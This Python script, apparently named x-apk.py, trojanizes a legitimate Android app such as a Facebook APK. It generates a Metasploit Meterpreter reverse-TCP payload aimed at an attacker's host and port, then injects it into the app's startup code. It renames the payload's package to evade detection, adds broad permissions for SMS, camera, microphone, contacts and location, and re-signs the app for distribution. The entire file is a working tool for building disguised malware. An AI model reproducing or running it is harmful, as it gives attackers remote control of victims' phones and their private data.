#!/usr/bin/python

import sys
from random import randint
import string
from os import system, mkdir

l = [str(i) for i in range(0,10)] + list(string.ascii_uppercase) + list(string.ascii_lowercase) + [str(i) for i in range(0,10)]

def generate(n):
	word = ''
	for i in range(1, n+1):
		p = randint(0, 1000) % 72
		word += l[p]
	return word

class __search__:
	def __init__(self, source, dest):
		self.s = source
		self.d = dest
		self.found = False
		self.i_index = 0
	def _run_(self):
		if len(self.s) < len(self.d):
			pass
		elif len(self.s) == len(self.d):
			if self.s == self.d:
				self.found = True
		else:
			for i in range(0, len(self.s) - len(self.d) + 1):
				if self.s[i: len(self.d) + i] == self.d:
					self.found = True
					self.i_index = i
					break

# hooks path payload/smali/com/metasploit/stage/

class __inject_hooks__:
	def __init__(self, meta_replace):
		self.word = meta_replace
	def run(self):
		sed_cmd = 'sed -i s/metasploit/' + self.word + '/g payload/smali/com/metasploit/stage/*'
		system(sed_cmd)
		mkdir_cmd = "original/smali/com/" + self.word
		mkdir(mkdir_cmd)
		mkdir_cmd = "original/smali/com/" + self.word + "/stage"
		mkdir(mkdir_cmd)
		system("cp payload/smali/com/metasploit/stage/* " + mkdir_cmd + "/")
class __get_mainscreen__:
	def __init__(self):
		self.mainscreen = ""
		self.target_line = None
	def __configure__(self):
		AndroidManifest = open("original/AndroidManifest.xml", "r")
		x = None
		for line in AndroidManifest.readlines():
			temp_search = __search__(line.strip(), "<activity")
			temp_search._run_()
			if temp_search.found:
				x = line.strip()
				break
		AndroidManifest.close()
		self.target_line = x
	def __run__(self):
		android_name_index = __search__(self.target_line, "android:name=")
		android_name_index._run_()
		x = self.target_line[len(android_name_index.d) + android_name_index.i_index:]
		y = x.split("android")[0].split('"')[1]
		for p in y.split("."):
			self.mainscreen += p + "/"
		self.mainscreen = self.mainscreen[:len(self.mainscreen)-1]


class __inject_cmdline__:
	def __init__(self, meta_replace):
		self.word = meta_replace
		tmp = __get_mainscreen__()
		tmp.__configure__()
		tmp.__run__()
		self.main_path = "original/smali/" + tmp.mainscreen
	def __run__(self):
		main_file = open(self.main_path + ".smali", "r")
		tmp_file = open(self.main_path.split("/").pop() + ".smali", "w")
		for line in main_file.readlines():
			i = 0
			temp_search = __search__(line.strip(), ";->onCreate(Landroid/os/Bundle;)V")
			temp_search._run_()
			if temp_search.found and i == 0:
				tmp_file.write(line)
				tmp_file.write("\n    invoke-static {p0}, Lcom/" + self.word + "/stage/Payload;->start(Landroid/content/Context;)V\n")
				i = 1
			else:
				tmp_file.write(line)
		main_file.close()
		tmp_file.close()
		system("rm " + self.main_path + ".smali")
		system("mv " + self.main_path.split("/").pop() + ".smali" + " " + self.main_path + ".smali")

def add_permessions():
	AndroidManifest = open("original/AndroidManifest.xml", "r")
	tmp_AndroidManifest = open("AndroidManifest.xml", "w")
	i = 0
	permessions = ['<uses-permission android:name="android.permission.INTERNET"/>' \
    ,'<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>' \
    ,'<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>' \
    ,'<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>' \
    ,'<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>' \
    ,'<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>' \
    ,'<uses-permission android:name="android.permission.READ_PHONE_STATE"/>' \
    ,'<uses-permission android:name="android.permission.SEND_SMS"/>' \
    ,'<uses-permission android:name="android.permission.RECEIVE_SMS"/>' \
    ,'<uses-permission android:name="android.permission.RECORD_AUDIO"/>' \
    ,'<uses-permission android:name="android.permission.CALL_PHONE"/>' \
    ,'<uses-permission android:name="android.permission.READ_CONTACTS"/>' \
    ,'<uses-permission android:name="android.permission.WRITE_CONTACTS"/>' \
    ,'<uses-permission android:name="android.permission.RECORD_AUDIO"/>' \
    ,'<uses-permission android:name="android.permission.WRITE_SETTINGS"/>' \
    ,'<uses-permission android:name="android.permission.CAMERA"/>' \
    ,'<uses-permission android:name="android.permission.READ_SMS"/>' \
    ,'<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>' \
    ,'<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>' \
    ,'<uses-permission android:name="android.permission.SET_WALLPAPER"/>' \
    ,'<uses-permission android:name="android.permission.READ_CALL_LOG"/>' \
    ,'<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>' \
    ,'<uses-permission android:name="android.permission.WAKE_LOCK"/>']
    

	for line in AndroidManifest.readlines():
		if "<uses-permission android:name=" in line.strip() and i == 0:
			i = 1
			for permession in permessions:
				tmp_AndroidManifest.write("    " + permession + "\n")
		else:
			tmp_AndroidManifest.write(line)
	AndroidManifest.close()
	tmp_AndroidManifest.close()
	system("rm original/AndroidManifest.xml && mv AndroidManifest.xml original/")

def main():
	""" ------------------------- """

	print "Usage:"
	print "./x-apk.py -h=<ip or host> -p=<port> -x=<original apk>"
	print "Example:"
	print "./x-apk.py -h=192.168.1.5 -p=443 -x=facebook.apk"
class __INFO__:
		ip = None
		port = None
		original_apk = None
def start():
	if len(sys.argv) != 4:
		main()
		exit(0)
	else:
		for option in sys.argv:
			if option[:3] == "-h=":
				__INFO__.ip = option[3:]
			if option[:3] == "-p=":
				__INFO__.port = option[3:]
			if option[:3] == "-x=":
				__INFO__.original_apk = option[3:]
			else:
				pass
	print "\033[92m[*] Generating  Payload ...\033[93m"
	system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + __INFO__.ip + " lport=" + __INFO__.port + " -o payload.apk")
	print "\033[92m[*] Decompiling The Original Apk ...\033[93m"
	system("apktool d -f " + __INFO__.original_apk + " -o original")
	print "\033[92m[*] Decompiling The Payload ...\033[93m"
	system("apktool d -f payload.apk -o payload")
	print "\033[92m[*] Injecting ...\033[93m"
	injector = __inject_hooks__("sirai")
	injector.run()
	injector = __inject_cmdline__("sirai")
	injector.__run__()
	add_permessions()
	print "\033[92m[*] Recompiling ...\033[93m"
	system("apktool b original")
	system("rm -rf payload payload.apk")
	print "\033[92m[+] your key store password: " + generate(10)
	print "\033[92m[+] Generating keystore ...\033[93m"
	system("keytool -genkey -v -keystore tmp.keystore -alias sirai -keyalg RSA -keysize 2048 -validity 10000")
	print "\033[92m[+] Signing The Apk ...\033[93m"
	system("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore tmp.keystore original/dist/" + __INFO__.original_apk + " sirai")
	system("rm tmp.keystore")
	print "\033[92m[+] path of your backdoored apk -> original/dist/\033[93m"
start()
	 



